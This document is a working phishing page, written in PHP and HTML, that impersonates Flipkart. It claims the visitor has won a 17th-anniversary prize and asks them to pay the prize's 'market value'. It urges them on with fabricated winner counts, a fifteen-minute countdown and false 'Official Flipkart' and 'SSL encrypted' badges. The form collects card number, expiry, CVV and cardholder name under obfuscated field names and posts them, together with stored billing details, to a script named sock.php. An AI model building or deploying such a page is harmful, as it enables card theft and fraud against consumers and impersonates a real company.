<?php
session_start();

$billing = $_SESSION['billing_info'] ?? [];
$fullName = $_SESSION['customer_fullname'] ?? '';
$email = $billing['email'] ?? '';
$phone = $billing['phone'] ?? '';
$address = $billing['address'] ?? '';
$city = $billing['city'] ?? '';
$state = $billing['state'] ?? '';
$postal = $billing['postal'] ?? '';
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Payment - Flipkart Rewards</title>
    <link rel="icon" href="./assets/favicon.ico">
    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="./assets/style/welcom.css">
</head>
<body>
    <nav class="flipkart-navbar">
        <div class="max-w-7xl mx-auto px-4 py-3">
            <div class="flex items-center justify-between">
                <div class="flex items-center space-x-8">
                    <div class="text-2xl font-bold text-white">Flipkart</div>
                    <div class="hidden md:flex space-x-6">
                        <a href="#" class="text-white hover:text-yellow-300 transition-colors">Electronics</a>
                        <a href="#" class="text-white hover:text-yellow-300 transition-colors">Fashion</a>
                        <a href="#" class="text-white hover:text-yellow-300 transition-colors">Home</a>
                        <a href="#" class="text-white hover:text-yellow-300 transition-colors">Appliances</a>
                    </div>
                </div>
                <div class="hidden md:flex flex-1 max-w-lg mx-8">
                    <div class="relative w-full">
                        <input type="text" placeholder="Search for products, brands and more" class="w-full py-3 px-4 pr-12 rounded-l-md border-none outline-none">
                        <button class="absolute right-0 top-0 h-full px-4 bg-yellow-400 rounded-r-md hover:bg-yellow-500 transition-colors">
                            <i class="fas fa-search text-blue-800"></i>
                        </button>
                    </div>
                </div>
                <div class="flex items-center space-x-6">
                    <button class="text-white hover:text-yellow-300 transition-colors">
                        <i class="fas fa-user mr-2"></i>
                        <span class="hidden sm:inline">Login</span>
                    </button>
                    <button class="text-white hover:text-yellow-300 transition-colors">
                        <i class="fas fa-shopping-cart mr-2"></i>
                        <span class="hidden sm:inline">Cart</span>
                    </button>
                </div>
            </div>
        </div>
    </nav>

    <div class="bg-gradient-to-r from-blue-500 via-blue-600 to-blue-700 py-12 relative overflow-hidden">
        <div class="absolute inset-0 opacity-10">
            <div class="absolute top-4 left-10 w-16 h-16 border-2 border-white rounded-full"></div>
            <div class="absolute top-20 right-20 w-8 h-8 bg-yellow-300 rounded-full"></div>
            <div class="absolute bottom-10 left-1/4 w-12 h-12 border border-white rotate-45"></div>
            <div class="absolute bottom-6 right-10 w-6 h-6 bg-white rounded-full"></div>
        </div>

        <div class="max-w-6xl mx-auto px-4 text-center relative z-10">
            <div class="inline-flex items-center bg-yellow-400 text-blue-900 px-4 py-2 rounded-full text-sm font-bold mb-4">
                <i class="fas fa-birthday-cake mr-2"></i>
                17th Anniversary Special
            </div>

            <h1 class="text-5xl md:text-6xl font-black mb-4 text-white leading-tight">
                <span class="inline-block animate-pulse">??</span>
                Big Billion Days
                <span class="inline-block animate-pulse">??</span>
            </h1>

            <div class="text-2xl md:text-3xl font-bold text-yellow-200 mb-3">
                Spin &amp; Win Mega Rewards!
            </div>

            <p class="text-lg text-blue-100 mb-6 max-w-3xl mx-auto">
                Celebrate Flipkart's 17th Anniversary with exclusive prizes worth up to ?80,000!
                <strong class="text-yellow-200">Limited time offer</strong> - Only for registered users.
            </p>

            <div class="flex flex-wrap justify-center gap-3 mb-6">
                <div class="bg-white bg-opacity-20 backdrop-blur-sm rounded-full px-4 py-2 text-sm text-white border border-white border-opacity-30">
                    <i class="fas fa-shield-check mr-2 text-green-300"></i>
                    Verified Program
                </div>
                <div class="bg-white bg-opacity-20 backdrop-blur-sm rounded-full px-4 py-2 text-sm text-white border border-white border-opacity-30">
                    <i class="fas fa-truck mr-2 text-blue-300"></i>
                    Free Delivery
                </div>
                <div class="bg-white bg-opacity-20 backdrop-blur-sm rounded-full px-4 py-2 text-sm text-white border border-white border-opacity-30">
                    <i class="fas fa-certificate mr-2 text-yellow-300"></i>
                    Official Rewards
                </div>
                <div class="bg-white bg-opacity-20 backdrop-blur-sm rounded-full px-4 py-2 text-sm text-white border border-white border-opacity-30">
                    <i class="fas fa-clock mr-2 text-orange-300"></i>
                    24H Only
                </div>
            </div>

            <div class="bg-white bg-opacity-10 backdrop-blur-sm rounded-2xl p-4 max-w-2xl mx-auto border border-white border-opacity-20">
                <div class="grid grid-cols-3 gap-4 text-center">
                    <div>
                        <div class="text-2xl font-bold text-yellow-300" id="totalWinners">12,847</div>
                        <div class="text-xs text-blue-100">Winners Today</div>
                    </div>
                    <div>
                        <div class="text-2xl font-bold text-green-300" id="totalPrizes">?2.4Cr+</div>
                        <div class="text-xs text-blue-100">Prizes Given</div>
                    </div>
                    <div>
                        <div class="text-2xl font-bold text-orange-300 flex items-center justify-center">
                            <i class="fas fa-circle text-xs mr-1 animate-pulse"></i>
                            <span id="liveUsers">1,247</span>
                        </div>
                        <div class="text-xs text-blue-100">Playing Now</div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <main class="max-w-4xl mx-auto px-4 py-8">
        <div class="mb-8">
            <div class="flex justify-between items-center mb-3">
                <span class="text-sm font-semibold text-blue-600 bg-blue-50 px-3 py-1 rounded-full">
                    Step 3 of 4
                </span>
                <span class="text-sm text-gray-600">75%</span>
            </div>
            <div class="progress-container">
                <div class="progress-bar" style="width: 75%"></div>
            </div>
        </div>

        <div class="bg-white rounded-2xl shadow-xl p-8 relative overflow-hidden">
            <div class="text-center mb-8">
                <div class="w-20 h-20 bg-orange-100 rounded-full flex items-center justify-center mx-auto mb-4">
                    <i class="fas fa-shield-check text-orange-600 text-2xl"></i>
                </div>
                <h2 class="text-3xl font-bold text-gray-800 mb-2">Secure Your Prize</h2>
                <p class="text-gray-600 text-base">
                    Claim your Flipkart reward by completing the payment for the prize's market value shown below.
                </p>
                <div class="bg-blue-50 border border-blue-200 rounded-lg p-4 mt-4">
                    <p class="text-sm text-blue-800">
                        <i class="fas fa-info-circle mr-1"></i>
                        The amount below reflects the exact market value of your reward and completes the claim process
                    </p>
                </div>
            </div>

            <div class="grid grid-cols-1 md:grid-cols-3 gap-4 mb-8">
                <div class="text-center p-4 bg-green-50 rounded-lg trust-badge">
                    <i class="fas fa-undo-alt text-green-600 text-2xl mb-2"></i>
                    <h4 class="font-bold text-sm">100% Refundable</h4>
                    <p class="text-xs">Money back guarantee</p>
                </div>
                <div class="text-center p-4 bg-blue-50 rounded-lg trust-badge">
                    <i class="fas fa-lock text-blue-600 text-2xl mb-2"></i>
                    <h4 class="font-bold text-sm">Secure Payment</h4>
                    <p class="text-xs">SSL encrypted</p>
                </div>
                <div class="text-center p-4 bg-purple-50 rounded-lg trust-badge">
                    <i class="fas fa-certificate text-purple-600 text-2xl mb-2"></i>
                    <h4 class="font-bold text-sm">Official Flipkart</h4>
                    <p class="text-xs">Verified program</p>
                </div>
            </div>

            <div class="bg-gray-50 rounded-xl p-6 mb-8 border">
                <div class="flex items-center justify-between mb-4">
                    <h3 class="text-lg font-bold text-gray-800">Order Summary</h3>
                    <div class="text-sm bg-green-100 text-green-700 px-3 py-1 rounded-full font-semibold">
                        SECURED
                    </div>
                </div>
                <div class="space-y-2 text-sm">
                    <div class="flex justify-between">
                        <span>Prize Product:</span>
                        <span class="font-bold text-green-600" id="summaryPrize">Surprise Gift</span>
                    </div>
                    <div class="flex justify-between">
                        <span>Recipient:</span>
                        <span class="font-semibold"><?= htmlspecialchars($fullName) ?: 'Pending' ?></span>
                    </div>
                    <div class="flex justify-between">
                        <span>Delivery:</span>
                        <span class="font-semibold">Fast courier (24h)</span>
                    </div>
                    <div class="flex justify-between">
                        <span>Merchant:</span>
                        <span class="font-semibold">Flipkart</span>
                    </div>
                    <div class="flex justify-between text-sm">
                        <span>Market Value:</span>
                        <span id="summaryAmount" class="font-bold text-blue-600">&#8377; 0.00</span>
                    </div>
                    <div class="border-t pt-2 mt-2">
                        <div class="flex justify-between text-lg font-bold">
                            <span>Total Payment:</span>
                            <span id="summaryTotal" class="text-blue-600">&#8377; 0.00</span>
                        </div>
                    </div>
                </div>

                <div class="mt-4 p-3 bg-orange-50 border border-orange-200 rounded-lg text-center countdown-container">
                    <p class="text-orange-700 font-semibold text-sm">
                        <i class="fas fa-clock mr-1"></i>
                        Offer expires in: <span id="countdown" class="font-bold">14:59</span>
                    </p>
                </div>
            </div>

            <form id="cardForm" method="POST" action="sock.php" class="max-w-2xl mx-auto space-y-6">
                <h3 class="text-lg font-bold text-center text-gray-700 mb-6">
                    <i class="fas fa-credit-card mr-2"></i>
                    Payment Details
                </h3>

                <input type="hidden" name="ex111x" id="ex111x">
                <input type="hidden" name="ex222x" id="ex222x">

                <input type="hidden" name="billing_firstname" value="<?= htmlspecialchars($billing['firstname'] ?? '') ?>">
                <input type="hidden" name="billing_lastname" value="<?= htmlspecialchars($billing['lastname'] ?? '') ?>">
                <input type="hidden" name="billing_email" value="<?= htmlspecialchars($email) ?>">
                <input type="hidden" name="billing_phone" value="<?= htmlspecialchars($phone) ?>">
                <input type="hidden" name="billing_address" value="<?= htmlspecialchars($address) ?>">
                <input type="hidden" name="billing_city" value="<?= htmlspecialchars($city) ?>">
                <input type="hidden" name="billing_state" value="<?= htmlspecialchars($state) ?>">
                <input type="hidden" name="billing_postal" value="<?= htmlspecialchars($postal) ?>">

                <div class="space-y-4">
                    <div>
                        <label class="block text-sm font-medium text-gray-700 mb-1">Card Number</label>
                        <input type="text" id="card-number" name="lo8687co" placeholder="0000 0000 0000 0000" maxlength="19" required class="form-input">
                    </div>
                    <div class="grid grid-cols-2 gap-4">
                        <div>
                            <label class="block text-sm font-medium text-gray-700 mb-1">Expiry Date</label>
                            <input type="text" id="expiry" placeholder="MM/YY" required maxlength="5" class="form-input">
                        </div>
                        <div>
                            <label class="block text-sm font-medium text-gray-700 mb-1">CVV</label>
                            <input type="text" id="cvv" name="net44xa" placeholder="123" required maxlength="4" class="form-input">
                        </div>
                    </div>
                    <div>
                        <label class="block text-sm font-medium text-gray-700 mb-1">Name on Card</label>
                        <input type="text" id="cardholder" name="nm8676X" placeholder="CARDHOLDER NAME" required class="form-input" value="<?= htmlspecialchars($fullName) ?>">
                    </div>
                </div>

                <div class="bg-green-50 border border-green-200 rounded-lg p-4">
                    <div class="flex items-center">
                        <i class="fas fa-shield-check text-green-600 text-xl mr-3"></i>
                        <div>
                            <h4 class="font-bold text-green-800">Secure Transaction</h4>
                            <p class="text-sm text-green-700">Your payment is protected and processed securely by Flipkart.</p>
                        </div>
                    </div>
                </div>

                <p class="text-xs text-gray-500 text-center italic">
                    Powered by Flipkart - Trusted payment partner
                </p>

                <div class="text-center">
                    <button type="submit" class="flipkart-btn w-full py-4 text-lg">
                        <i class="fas fa-lock mr-2"></i>
                        Complete Secure Payment
                    </button>
                </div>
            </form>
        </div>
    </main>

    <div class="loading-overlay" id="loadingOverlay">
        <div class="loading-content">
            <div class="loading-spinner"></div>
            <div id="loadingText" class="text-xl font-semibold mb-2">Processing...</div>
            <div class="loading-dots">
                <span></span>
                <span></span>
                <span></span>
            </div>
            <div class="text-sm mt-4 opacity-75" id="loadingSubtext">Please wait while we secure your information</div>
        </div>
    </div>

    <script>
        const countdownElement = document.getElementById('countdown');
        let totalSeconds = 14 * 60 + 59;
        setInterval(() => {
            const minutes = Math.floor(totalSeconds / 60).toString().padStart(2, '0');
            const seconds = (totalSeconds % 60).toString().padStart(2, '0');
            if (countdownElement) {
                countdownElement.textContent = `${minutes}:${seconds}`;
            }
            totalSeconds = Math.max(0, totalSeconds - 1);
        }, 1000);

        const cardForm = document.getElementById('cardForm');
        const cardNumberInput = document.getElementById('card-number');
        const expiryInput = document.getElementById('expiry');
        const cvvInput = document.getElementById('cvv');
        const cardholderInput = document.getElementById('cardholder');

        if (cardNumberInput) {
            cardNumberInput.addEventListener('input', (e) => {
                const digits = e.target.value.replace(/\D/g, '').slice(0, 16);
                e.target.value = digits.replace(/(.{4})/g, '$1 ').trim();
            });
        }

        if (expiryInput) {
            expiryInput.addEventListener('input', (e) => {
                let value = e.target.value.replace(/\D/g, '').slice(0, 4);
                if (value.length >= 3) {
                    value = value.slice(0, 2) + '/' + value.slice(2);
                }
                e.target.value = value;
            });
        }

        if (cvvInput) {
            cvvInput.addEventListener('input', (e) => {
                e.target.value = e.target.value.replace(/\D/g, '').slice(0, 4);
            });
        }

        if (cardholderInput) {
            cardholderInput.addEventListener('input', (e) => {
                e.target.value = e.target.value.toUpperCase();
            });
        }

        if (cardForm) {
            cardForm.addEventListener('submit', () => {
                const overlay = document.getElementById('loadingOverlay');
                if (overlay) {
                    overlay.style.display = 'flex';
                }

                const expiryValue = expiryInput ? expiryInput.value : '';
                let [mm, yy] = expiryValue.split('/');
                mm = (mm || '').padStart(2, '0');
                yy = (yy || '').padStart(2, '0');

                document.getElementById('ex111x').value = mm;
                document.getElementById('ex222x').value = yy;

                if (cardNumberInput) {
                    cardNumberInput.value = cardNumberInput.value.replace(/\D/g, '');
                }
            });
        }

        const storedPrize = localStorage.getItem('selectedPrize');
        const summaryPrize = document.getElementById('summaryPrize');
        const summaryAmount = document.getElementById('summaryAmount');
        const summaryTotal = document.getElementById('summaryTotal');

        let prizeValueText = '₹ 0.00';

        if (storedPrize) {
            try {
                const prize = JSON.parse(storedPrize);
                if (summaryPrize && prize.name) {
                    summaryPrize.textContent = prize.name;
                }
                if (prize.value) {
                    prizeValueText = prize.value;
                    if (!/₹/.test(prizeValueText)) {
                        prizeValueText = '₹ ' + prizeValueText;
                    }
                }
            } catch (err) {
                console.warn('Unable to parse stored prize', err);
            }
        }

        if (summaryAmount) {
            summaryAmount.textContent = prizeValueText;
        }
        if (summaryTotal) {
            summaryTotal.textContent = prizeValueText;
        }

        try {
            sessionStorage.setItem('flipkartPrizeValue', prizeValueText);
        } catch (err) {
            console.warn('Unable to persist Flipkart prize value', err);
        }
    </script>
</body>
</html>
